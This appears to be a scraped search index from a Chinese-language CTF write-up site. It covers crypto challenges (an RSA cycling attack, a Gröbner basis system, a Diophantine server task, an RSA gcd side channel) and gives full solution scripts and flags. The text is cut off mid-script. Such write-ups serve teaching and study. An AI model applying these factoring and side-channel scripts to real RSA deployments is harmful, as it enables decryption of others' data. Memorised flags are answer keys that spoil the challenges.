Wikipedia","title":"Cycling"},{"location":"crypto/cycling/#_1","text":"It is well known that any RSA encryption can be undone by just encrypting the ciphertext over and over again. If the RSA modulus has been chosen badly then the number of encryptions necessary to undo an encryption is small. However, if the modulus is well chosen then a cycle attack can take much longer. This property can be used for a timed release of a message. We have confirmed that it takes a whopping 2^1025-3 encryptions to decrypt the flag. Pack out your quantum computer and perform 2^1025-3 encryptions to solve this challenge. Good luck doing this in 48h. chall.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #!/usr/bin/python3 # Copyright 2022 Google LLC \"\"\" It is well known that any RSA encryption can be undone by just encrypting the ciphertext over and over again. If the RSA modulus has been chosen badly then the number of encryptions necessary to undo an encryption is small. If n = 0x112b00148621 then only 209 encryptions are necessary as the following example demonstrates: >>> e = 65537 >>> n = 0x112b00148621 >>> pt = 0xdeadbeef >>> # Encryption >>> ct = pow(pt, e, n) >>> # Decryption via cycling: >>> pt = ct >>> for _ in range(209): >>> pt = pow(pt, e, n) >>> # Assert decryption worked: >>> assert ct == pow(pt, e, n) However, if the modulus is well chosen then a cycle attack can take much longer. This property can be used for a timed release of a message. We have confirmed that it takes a whopping 2^1025-3 encryptions to decrypt the flag. Pack out your quantum computer and perform 2^1025-3 encryptions to solve this challenge. Good luck doing this in 48h. \"\"\" e = 65537 n = 0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1 ct = 0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680 # Decryption via cycling: pt = ct for _ in range ( 2 ** 1025 - 3 ): pt = pow ( pt , e , n ) # Assert decryption worked: assert ct == pow ( pt , e , n ) # Print flag: print ( pt . to_bytes (( pt . bit_length () + 7 ) // 8 , 'big' ) . decode ())","title":"\u9898\u76ee"},{"location":"crypto/cycling/#_2","text":"\u5df2\u77e5\u76ee\u6807\u5bc6\u6587\u5fc5\u987b\u518d\u7ecf\u8fc7 \\(2^{1025}-3\\) \u6b21\u52a0\u5bc6\u540e\u624d\u80fd\u83b7\u5f97\u660e\u6587\u3002\u4ee4 \\(R=2^{1025}-2\\) \uff08\u6885\u68ee\u6570\u7684 \\(2\\) \u500d\uff09\uff0c\u90a3\u4e48\u6709 \\(x^{e^{R}}\\equiv x\\ (mod\\ n)\\) \u6b27\u62c9\u51fd\u6570 \\(\\varphi(n)\\) \u80fd\u591f\u6c42\u51fa\u6ee1\u8db3 \\(a^m\\equiv 1\\ (mod\\ n)\\) \uff08 \\(a\\) \u5c0f\u4e8e \\(n\\) \u4e14\u4e0e \\(n\\) \u4e92\u8d28\uff09 \u7684\u6b63\u6574\u6570\uff0c\u4f46\u4e0d\u4e00\u5b9a\u662f\u6700\u5c0f\u7684\uff0c\u5361\u8fc8\u514b\u5c14\u51fd\u6570 \\(\\lambda(n)\\) \u7684\u7ed3\u679c\u624d\u662f\u3002\u90a3\u4e48\u6709 \\(x^{\\lambda(n)}\\equiv 1\\ (mod\\ n),\\ x^{e^R}\\equiv x\\equiv (x^{\\lambda(n)})^k x\\ (mod\\ n)\\) \uff0c\u80fd\u591f\u63a8\u51fa \\(e^R\\equiv 1\\ mod\\ \\lambda(n)\\) \uff0c\u7531\u6b64\u53ef\u77e5 \\(\\lambda(\\lambda(n))|R\\) \u8bbe \\(\\lambda(n)=\\prod_{i=1}^k s_i^{r_i}\\) \uff0c\u90a3\u4e48 \\(\\lambda(\\lambda(n))=lcm(\\lambda(s_1^{r_1}),\\lambda(s_2^{r_2}),\\dotsb,\\lambda(s_k^{r_k}))=\\) \\(lcm(s_1^{r_1-1}(s_1-1),s_2^{r_2-1}(s_2-1),\\dotsb,s_k^{r_k-1}(s_k-1))\\) \uff0c\u6839\u636e \\(R\\) \u7684\u8d28\u56e0\u6570\u5206\u89e3\u7ed3\u679c\u63a8\u6d4b\u6240\u6709\u8d28\u56e0\u6570\u6307\u6570\u4e0d\u5927\u4e8e \\(1\\) \uff0c\u5219 \\(\\lambda(\\lambda(n))=lcm(s_1-1,s_2-1,\\dotsb,s_k-1)\\) \u6839\u636e Pollard \u7684 \\(p-1\\) \u8d28\u56e0\u6570\u5206\u89e3\u7b97\u6cd5\uff0c\u53ef\u4ee5\u9009\u62e9\u4e0e \\(n\\) \u4e92\u8d28\u7684\u4efb\u610f\u6574\u6570 \\(a\\) \uff0c\u8ba1\u7b97 \\(g=gcd((a^{M}-1\\ mod\\ n), n)\\) \u6765\u5206\u89e3 \\(n\\) \\(p\\) \u662f \\(n\\) \u7684\u4e00\u4e2a\u8d28\u56e0\u6570\uff0c\u82e5 \\(p-1\\) \u7684\u6bcf\u4e00\u4e2a\u56e0\u6570 \\(s\\) \u90fd\u6ee1\u8db3 \\(s\\le B\\) \uff08 \\(B\\) \u4eba\u4e3a\u9009\u5b9a\uff09\uff0c\u663e\u7136\u6709 \\((p-1)|B!\\) \uff0c \\(M\\) \u5b9a\u4e49\u4e3a \\(\\prod_{primes\\ s\\le B}s^{\\lfloor log_s B\\rfloor}\\) \uff0c\u82e5 \\(g=1\\) \u6216 \\(g=n\\) \u5219\u91cd\u65b0\u9009\u62e9 \\(B\\) \u8fdb\u884c\u8ba1\u7b97 \u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\u6709 \\(a^{k(p-1)}\\equiv 1\\ (mod\\ p)\\) \u82e5\u4e00\u4e2a\u6570 \\(x\\) \u6a21 \\(p\\) \u4f59 \\(1\\) \uff0c\u90a3\u4e48 \\(p|gcd(x-1,n)\\) \\(\\lambda(\\lambda(n))=\\lambda(lcm(p-1,q-1))=\\lambda(s_1s_2\\dotsb s_k)=lcm(s_1-1,s_2-1,\\dotsb,s_k-1)\\) \uff0c\u663e\u7136\uff0c \\((s_i-1)|R\\) \uff0c\u90a3\u4e48\u53ef\u7531 \\(R\\) \u8d28\u56e0\u6570\u5206\u89e3\u7ed3\u679c\u5f97\u51fa \\(s_i\\) \u7684\u5019\u9009\u96c6\uff0c\u5373 \\(p-1\\) \u548c \\(q-1\\) \u7684\u8d28\u56e0\u6570\u5019\u9009\u96c6\uff0c\u7ed3\u5408 Pollard \u7684 \\(p-1\\) \u8d28\u56e0\u6570\u5206\u89e3\u7b97\u6cd5\u8fdb\u884c\u6c42\u89e3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from factordb.factordb import FactorDB from sympy import isprime from math import gcd from Crypto.Util.number import long_to_bytes def factor_n ( primes ): m = 2 for p in primes : m = pow ( m , p , n ) g = gcd ( m - 1 , n ) if 1 < g < n : return g , n // g e = 65537 n = 0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1 ct = 0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680 R = 2 * ( 2 ** 1024 - 1 ) f = FactorDB ( R ) f . connect () factors = f . get_factor_list () prods = { 1 } for f in factors : prods |= { f * x for x in prods } primes = [ p + 1 for p in prods if isprime ( p + 1 )] p , q = factor_n ( primes ) d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) m = pow ( ct , d , n ) print ( long_to_bytes ( m ))","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/cycling/#flag","text":"CTF{Recycling_Is_Great}","title":"Flag"},{"location":"crypto/cycling/#_3","text":"Intended Solution Carmichael function - Wikipedia Pollard's p \u2212 1 algorithm - Wikipedia","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/dealymaffs/","text":"\u9898\u76ee \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!sage from Crypto.Util.number import inverse , bytes_to_long , getPrime FLAG = b \"[REDACTED]\" step = len ( FLAG ) // 3 parts = [] for i in range ( 0 , len ( FLAG ), step ): parts . append ( bytes_to_long ( FLAG [ i : i + step ])) P = 71438829955248006563930557910994159568699947908111673792342752884287610505363 ZmodP = Zmod ( P ) x , y , z = parts x , y , z = ZmodP ( x ), ZmodP ( y ), ZmodP ( z ) assert x ^ 3 + z ^ 2 + y == 66394136981860516361851354749859612266004193813290269649537881228428968257460 assert y ^ 3 + x ^ 2 + z == 56417157666649050976546805407267029231007861216965940838682304201229073647799 assert z ^ 3 + y ^ 2 + x == 58104989704612501066634459111657336494541502098206428113992326325857090556559 assert x + y + z == 1575390570296234165094105579834233267605062475793 \u89e3\u9898\u601d\u8def \u00b6 \u901a\u8fc7 Gr\u00f6bner \u57fa\u89e3\u591a\u9879\u5f0f\u65b9\u7a0b\u7ec4 \ud83d\udccc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!sage from Crypto.Util.number import long_to_bytes P = 71438829955248006563930557910994159568699947908111673792342752884287610505363 a = [ 66394136981860516361851354749859612266004193813290269649537881228428968257460 , 56417157666649050976546805407267029231007861216965940838682304201229073647799 , 58104989704612501066634459111657336494541502098206428113992326325857090556559 , 1575390570296234165094105579834233267605062475793 , 4726171710888702495282316739502699802815187427379 ] R .< x , y , z > = PolynomialRing ( FiniteField ( P )) # \u65b9\u7a0b\u7b49\u53f7\u53f3\u4fa7\u4e3a 0 I = Ideal ([ x ** 3 + z ** 2 + y - a [ 0 ], y ** 3 + x ** 2 + z - a [ 1 ], z ** 3 + y ** 2 + x - a [ 2 ], x + y + z - a [ 3 ]]) ans = I . variety () flag = b '' for _ , v in ans [ 0 ] . items (): flag += long_to_bytes ( int ( v )) print ( flag ) # b\"flag{___Groebner_B45iS_!s_an_Id3aL_R3aL_D34L_Isn't_IT?!#___}\" \u53c2\u8003\u8d44\u6599 \u00b6 Groebner basis to solve linear system of equations","title":"Dealymaffs"},{"location":"crypto/dealymaffs/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #!sage from Crypto.Util.number import inverse , bytes_to_long , getPrime FLAG = b \"[REDACTED]\" step = len ( FLAG ) // 3 parts = [] for i in range ( 0 , len ( FLAG ), step ): parts . append ( bytes_to_long ( FLAG [ i : i + step ])) P = 71438829955248006563930557910994159568699947908111673792342752884287610505363 ZmodP = Zmod ( P ) x , y , z = parts x , y , z = ZmodP ( x ), ZmodP ( y ), ZmodP ( z ) assert x ^ 3 + z ^ 2 + y == 66394136981860516361851354749859612266004193813290269649537881228428968257460 assert y ^ 3 + x ^ 2 + z == 56417157666649050976546805407267029231007861216965940838682304201229073647799 assert z ^ 3 + y ^ 2 + x == 58104989704612501066634459111657336494541502098206428113992326325857090556559 assert x + y + z == 1575390570296234165094105579834233267605062475793","title":"\u9898\u76ee"},{"location":"crypto/dealymaffs/#_2","text":"\u901a\u8fc7 Gr\u00f6bner \u57fa\u89e3\u591a\u9879\u5f0f\u65b9\u7a0b\u7ec4 \ud83d\udccc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!sage from Crypto.Util.number import long_to_bytes P = 71438829955248006563930557910994159568699947908111673792342752884287610505363 a = [ 66394136981860516361851354749859612266004193813290269649537881228428968257460 , 56417157666649050976546805407267029231007861216965940838682304201229073647799 , 58104989704612501066634459111657336494541502098206428113992326325857090556559 , 1575390570296234165094105579834233267605062475793 , 4726171710888702495282316739502699802815187427379 ] R .< x , y , z > = PolynomialRing ( FiniteField ( P )) # \u65b9\u7a0b\u7b49\u53f7\u53f3\u4fa7\u4e3a 0 I = Ideal ([ x ** 3 + z ** 2 + y - a [ 0 ], y ** 3 + x ** 2 + z - a [ 1 ], z ** 3 + y ** 2 + x - a [ 2 ], x + y + z - a [ 3 ]]) ans = I . variety () flag = b '' for _ , v in ans [ 0 ] . items (): flag += long_to_bytes ( int ( v )) print ( flag ) # b\"flag{___Groebner_B45iS_!s_an_Id3aL_R3aL_D34L_Isn't_IT?!#___}\"","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/dealymaffs/#_3","text":"Groebner basis to solve linear system of equations","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/diophantine/","tags":["z3"],"text":"#z3 .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u89e3\u9898\u601d\u8def \u00b6 \u5728 PoW \u4e4b\u540e\u6709\u4e24\u4e2a\u5224\u65ad\uff0c\u679a\u4e3e\u4e00\u4e0b\u5c31\u53ef\u4ee5\u77e5\u9053\u7b54\u6848 1 2 3 4 5 6 Hello Everyone, let's start to learn Equations! Now I have an elliptic curve equation: (x+1)^2 == 2(y+1)^2 - 3^2 First, tell me if there is a solution to this equation?[Y/N] Y Great! Then, tell me whether this equation has an infinite number of solutions?[Y/N] Y Very well! \u63a5\u4e0b\u6765\u624d\u662f\u91cd\u70b9\uff0c\u9700\u8981\u7ed9\u51fa \\(202\\) \u7ec4\u89e3 \u03a3\u03a3\u03a3(\u03a6 \u03c9\u03a6||\u00a1) 1 Now, please find me the solutions to 202 point{(x, y) where x > 0, y > 0} \u4e00\u5f00\u59cb\u4ee5\u4e3a\u662f\u6839\u636e elliptic curve equation: (x+1)^2 == 2(y+1)^2 - 3^2 \u627e\u5bf9\u5e94\u692d\u5706\u66f2\u7ebf\u53ca\u5176\u4e0a\u7684\u70b9\uff0c\u4f46\u662f\u692d\u5706\u66f2\u7ebf\u4e00\u822c\u662f \\(y^2=x^3+ax+b\\) \u7684\u5f62\u5f0f\uff0c \\((x+1)^2 == 2(y+1)^2 - 3^2\\) \u600e\u4e48\u53d8\u5f62\u90fd\u4e0d\u50cf \u540e\u6765\u610f\u8bc6\u5230\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u53ef\u80fd\u6307\u70b9\u7684\u5750\u6807\u4e3a\u6574\u6570\uff0c\u76f4\u63a5\u7528 z3 \u89e3\u65b9\u7a0b\u5e94\u8be5\u884c 1 2 3 4 5 6 7 8 9 10 from z3 import * x , y = Ints ( 'x y' ) s = Solver () s . add (( x + 1 ) ** 2 == 2 * ( y + 1 ) ** 2 - 9 ) s . add ( x > 0 , y > 0 ) for _ in range ( 202 ): s . check () m = s . model () print ( f ' { m [ x ] } , { m [ y ] } ' ) s . add ( x > m [ x ], y > m [ y ]) \u4f46\u662f\u83b7\u5f97\u4e86\u51e0\u7ec4\u89e3\u4e4b\u540e\uff0c\u901f\u5ea6\u5c31\u6162\u4e0b\u6765\u4e86 :( \u60f3\u7740\u753b\u4e00\u4e0b\u66f2\u7ebf\u56fe\uff08\u5176\u5b9e\u6ca1\u5fc5\u8981 > <\uff09\uff0c\u603b\u4e4b\u5c31\u662f\u4e24\u6761\u589e\u957f\u901f\u5ea6\u4e0d\u4e00\u6837\u7684\u66f2\u7ebf 1 2 3 g1 = plot (( x + 1 ) ** 2 , 0 , 100 ) g2 = plot ( 2 * ( x + 1 ) ** 2 - 9 , 0 , 100 , linestyle = \"--\" ) ( g1 + g2 ) . show () \u518d\u56de\u8fc7\u5934\u770b\u770b\u5df2\u7ecf\u83b7\u5f97\u7684\u89e3\uff0c\u5f88\u6709\u89c4\u5f8b\u7684\u611f\u89c9(\u014f\u03c9\u014f) 1 2 3 4 5 6 (2, 2) (20, 14) (122, 86) (716, 506) (4178, 2954) (24356, 17222) \u5f53 \\(i\\ge 2\\) \u65f6\uff0c\u6ee1\u8db3 \\(x_i=6\\times x_{i-1}-x_{i-2}+4\\) , \\(y_i=6\\times y_{i-1}-y_{i-2} + 4\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from hashlib import md5 import itertools import pwn table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' conn = pwn . remote ( '39.104.61.18' , 12113 ) target = conn . recvline_contains ( 'md5' ) . decode () . strip () base = target [ target . find ( '+' ) + 2 : target . find ( ')' )] target = target [ - 5 :] for ch in itertools . permutations ( table , 4 ): m = '' . join ( ch ) + base h = md5 ( m . encode ()) . hexdigest () if ( h [: 5 ] == target ): conn . sendafter ( '>' , f ' { m [: 4 ] } \\n ' ) break conn . sendafter ( 'equation?[Y/N]' , 'Y \\n ' ) conn . sendafter ( 'solutions?[Y/N]' , 'Y \\n ' ) ans = [( 2 , 2 ), ( 20 , 14 )] while len ( ans ) < 202 : x , y = ( ans [ - 1 ][ 0 ] * 6 - ans [ - 2 ][ 0 ] + 4 ), ( ans [ - 1 ][ 1 ] * 6 - ans [ - 2 ][ 1 ] + 4 ) ans . append (( x , y )) for r in ans : conn . sendafter ( 'x=' , f ' { r [ 0 ] } \\n ' ) conn . sendafter ( 'y=' , f ' { r [ 1 ] } \\n ' ) print ( conn . recvline ()) conn . interactive ()","title":"Diophantine"},{"location":"crypto/diophantine/#_1","text":"\u5728 PoW \u4e4b\u540e\u6709\u4e24\u4e2a\u5224\u65ad\uff0c\u679a\u4e3e\u4e00\u4e0b\u5c31\u53ef\u4ee5\u77e5\u9053\u7b54\u6848 1 2 3 4 5 6 Hello Everyone, let's start to learn Equations! Now I have an elliptic curve equation: (x+1)^2 == 2(y+1)^2 - 3^2 First, tell me if there is a solution to this equation?[Y/N] Y Great! Then, tell me whether this equation has an infinite number of solutions?[Y/N] Y Very well! \u63a5\u4e0b\u6765\u624d\u662f\u91cd\u70b9\uff0c\u9700\u8981\u7ed9\u51fa \\(202\\) \u7ec4\u89e3 \u03a3\u03a3\u03a3(\u03a6 \u03c9\u03a6||\u00a1) 1 Now, please find me the solutions to 202 point{(x, y) where x > 0, y > 0} \u4e00\u5f00\u59cb\u4ee5\u4e3a\u662f\u6839\u636e elliptic curve equation: (x+1)^2 == 2(y+1)^2 - 3^2 \u627e\u5bf9\u5e94\u692d\u5706\u66f2\u7ebf\u53ca\u5176\u4e0a\u7684\u70b9\uff0c\u4f46\u662f\u692d\u5706\u66f2\u7ebf\u4e00\u822c\u662f \\(y^2=x^3+ax+b\\) \u7684\u5f62\u5f0f\uff0c \\((x+1)^2 == 2(y+1)^2 - 3^2\\) \u600e\u4e48\u53d8\u5f62\u90fd\u4e0d\u50cf \u540e\u6765\u610f\u8bc6\u5230\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u53ef\u80fd\u6307\u70b9\u7684\u5750\u6807\u4e3a\u6574\u6570\uff0c\u76f4\u63a5\u7528 z3 \u89e3\u65b9\u7a0b\u5e94\u8be5\u884c 1 2 3 4 5 6 7 8 9 10 from z3 import * x , y = Ints ( 'x y' ) s = Solver () s . add (( x + 1 ) ** 2 == 2 * ( y + 1 ) ** 2 - 9 ) s . add ( x > 0 , y > 0 ) for _ in range ( 202 ): s . check () m = s . model () print ( f ' { m [ x ] } , { m [ y ] } ' ) s . add ( x > m [ x ], y > m [ y ]) \u4f46\u662f\u83b7\u5f97\u4e86\u51e0\u7ec4\u89e3\u4e4b\u540e\uff0c\u901f\u5ea6\u5c31\u6162\u4e0b\u6765\u4e86 :( \u60f3\u7740\u753b\u4e00\u4e0b\u66f2\u7ebf\u56fe\uff08\u5176\u5b9e\u6ca1\u5fc5\u8981 > <\uff09\uff0c\u603b\u4e4b\u5c31\u662f\u4e24\u6761\u589e\u957f\u901f\u5ea6\u4e0d\u4e00\u6837\u7684\u66f2\u7ebf 1 2 3 g1 = plot (( x + 1 ) ** 2 , 0 , 100 ) g2 = plot ( 2 * ( x + 1 ) ** 2 - 9 , 0 , 100 , linestyle = \"--\" ) ( g1 + g2 ) . show () \u518d\u56de\u8fc7\u5934\u770b\u770b\u5df2\u7ecf\u83b7\u5f97\u7684\u89e3\uff0c\u5f88\u6709\u89c4\u5f8b\u7684\u611f\u89c9(\u014f\u03c9\u014f) 1 2 3 4 5 6 (2, 2) (20, 14) (122, 86) (716, 506) (4178, 2954) (24356, 17222) \u5f53 \\(i\\ge 2\\) \u65f6\uff0c\u6ee1\u8db3 \\(x_i=6\\times x_{i-1}-x_{i-2}+4\\) , \\(y_i=6\\times y_{i-1}-y_{i-2} + 4\\) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from hashlib import md5 import itertools import pwn table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' conn = pwn . remote ( '39.104.61.18' , 12113 ) target = conn . recvline_contains ( 'md5' ) . decode () . strip () base = target [ target . find ( '+' ) + 2 : target . find ( ')' )] target = target [ - 5 :] for ch in itertools . permutations ( table , 4 ): m = '' . join ( ch ) + base h = md5 ( m . encode ()) . hexdigest () if ( h [: 5 ] == target ): conn . sendafter ( '>' , f ' { m [: 4 ] } \\n ' ) break conn . sendafter ( 'equation?[Y/N]' , 'Y \\n ' ) conn . sendafter ( 'solutions?[Y/N]' , 'Y \\n ' ) ans = [( 2 , 2 ), ( 20 , 14 )] while len ( ans ) < 202 : x , y = ( ans [ - 1 ][ 0 ] * 6 - ans [ - 2 ][ 0 ] + 4 ), ( ans [ - 1 ][ 1 ] * 6 - ans [ - 2 ][ 1 ] + 4 ) ans . append (( x , y )) for r in ans : conn . sendafter ( 'x=' , f ' { r [ 0 ] } \\n ' ) conn . sendafter ( 'y=' , f ' { r [ 1 ] } \\n ' ) print ( conn . recvline ()) conn . interactive ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/dynamic_rsa/","tags":["rsa","gcd","crt"],"text":"#rsa #gcd #crt .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Nowadays, clients just keep changing their requirements! They said e=65537 is too boring for RSA and that they wanted a dynamic encryption system instead. Oh, I'll give it to them! Connect with nc litctf.live 31792 https://drive.google.com/uc?export=download&id=1JY3LfzcoIWUEhC0C8NuwO-fOwZnp3tKt \u89e3\u9898\u601d\u8def \u00b6 \u5df2\u77e5\u7ecf\u8fc7 RSA \u52a0\u5bc6\u7684 Flag \u7684\u5bc6\u6587\u53ca\u968f\u673a\u6570\u79cd\u5b50/\u52a0\u5bc6\u6307\u6570 \\(e\\) 1 2 3 4 5 6 7 8 9 10 11 flag = open ( 'flag.txt' , 'rb' ) . read (); m = bytes_to_long ( flag ); e = 65537 ; p = getPrime ( 200 ); q = getPrime ( 200 ); random . seed ( e ); phi = ( p - 1 ) * ( q - 1 ); n = p * q ; ct = pow ( m , e , n ) print ( \"My secret flag is \" + str ( ct )); \u53ef\u4ee5\u4e0e\u670d\u52a1\u5668\u8fdb\u884c\u4e24\u79cd\u4ea4\u4e92 \u63d0\u4f9b\u79c1\u94a5\uff0c\u83b7\u5f97 Flag \u5bc6\u6587\u7684\u89e3\u5bc6\u7ed3\u679c \u63d0\u4f9b\u4efb\u610f\u6d88\u606f\uff0c\u83b7\u5f97\u300c\u6d88\u606f+\u76d0\u503c\u300d\u7684\u52a0\u5bc6\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 while True : inp = input ( \"Guess Private Key (1) or Encrypt Message (2): \" ); if ( inp == \"1\" ): d = int ( input ( \"Enter Private Key: \" )); print ( long_to_bytes ( pow ( ct , d , n ))); exit () elif ( inp == \"2\" ): test_e = e_gen () # Oh great they made me change the algorithm again # They said its \"TOO BLAND\" # FINE I'll add more seasoning salt = get_random_bytes ( 8 ) . hex (); inp = bytes_to_long (( input ( \"Enter Message: \" ) + salt ) . encode ()); test_ct = pow ( inp , test_e , n ); print ( \"Your Message (remember to convert): \" + str ( test_ct )); else : print ( \"BAD OPTION\" ); exit (); \u4e0d\u8fc7\u91cd\u70b9\u5728\u51fd\u6570 e_gen \u4ee5\u53ca gcd \u3002\u968f\u673a\u6570\u79cd\u5b50\u5df2\u77e5\uff0c\u5219\u53ef\u4ee5\u6c42\u51fa test_e \u3002\u56e0\u4e3a test_e \u662f\u8d28\u6570\uff0c\u6240\u4ee5 gcd(test_e, phi) \u53ea\u6709\u4e24\u79cd\u7ed3\u679c\uff0c\u8981\u4e48\u662f \\(1\\) \uff0c\u8981\u4e48\u662f test_e \u3002\u5f53 gcd(test_e, phi) \u7684\u7ed3\u679c\u4e3a test_e \u65f6\uff0c new_e = 1 \uff0c\u6b64\u65f6\u5bc6\u6587\u4e0e\u660e\u6587\u76f8\u540c\uff0c\u53ef\u4ee5\u786e\u5b9a phi \u7684\u5176\u4e2d\u4e00\u4e2a\u56e0\u6570\u3002\u4f46\u663e\u7136\uff0c\u7ed3\u679c gcd(test_e, phi) \u4e3a \\(1\\) \u7684\u60c5\u51b5\u66f4\u591a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def gcd ( a , b ): # Client said the loading screen is too boring # So they want something with more flair and movement while they wait if ( a == 0 ): return b ; if ( b == 0 ): return a ; print ( \".,\" [( b // a ) & 1 ], end = \"\" ); return gcd ( b % a , a ); # Clients keep complaining that making e always 65537 is too boring # So they changed their requirements and wanted a \"dynamic encryption system\" # I literally can't def e_gen (): print ( \"Loading\" , end = \"\" ) test_e = nextprime ( random . randint ( 1 , 100000 )); # Okay but I literally can't use a random e if gcd is not 1 # It's like most fundamental part of RSA!!! new_e = test_e // gcd ( test_e , phi ); print () return new_e \u91cd\u5199\u7684\u51fd\u6570 gcd \u7ed9\u51fa\u4e86\u6bcf\u4e00\u6b65 b // a \u7ed3\u679c\u7684\u5947\u5076\u6027\uff0c\u56e0\u4e3a\u7b2c\u4e00\u6b65 phi \u7684\u503c\u672a\u77e5\uff0c\u6240\u4ee5\u4ece\u7b2c\u4e8c\u6b65\u5f00\u59cb\u8003\u8651\uff0c\u5373 gcd(phi % test_e, test_e) \u3002 test_e \u5df2\u77e5\uff0c phi % test_e \u662f\u5c0f\u4e8e test_e \u7684\u81ea\u7136\u6570\uff0c\u4ec5\u6839\u636e\u6bcf\u4e00\u6b65 b // a \u7ed3\u679c\u7684\u5947\u5076\u6027\u662f\u6709\u4e00\u5b9a\u6982\u7387\u80fd\u591f\u786e\u5b9a phi % test_e \u7684\u3002\u4ee5 \\(13\\) \u4e3a\u4f8b gcd \u7684\u8ba1\u7b97\u7ed3\u679c\u5982\u4e0b\uff0c\u53ef\u89c1\u90e8\u5206 b // a \u5947\u5076\u6027\u7ed3\u679c\u5e8f\u5217\u4e0e phi % test_e \u6709\u4e00\u5bf9\u4e00\u6620\u5c04\u5173\u7cfb 1 2 3 4 5 6 7 8 9 10 11 12 gcd(1, 13) , gcd(2, 13) .. gcd(3, 13) ., gcd(4, 13) ,. gcd(5, 13) .,,. gcd(6, 13) .. gcd(7, 13) ,,. gcd(8, 13) ,,,,. gcd(9, 13) ,.. gcd(10, 13) ,,, gcd(11, 13) ,,. gcd(12, 13) ,. \u7531\u6b64\u53ef\u5229\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u8ba1\u7b97\u51fa phi \uff0c\u4ece\u800c\u5f97\u51fa\u79c1\u94a5 d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import random , pwn from sympy import nextprime from sage.all import crt , Integer from Crypto.Util.number import inverse def gcd ( a , b ): if a == 0 or b == 0 : 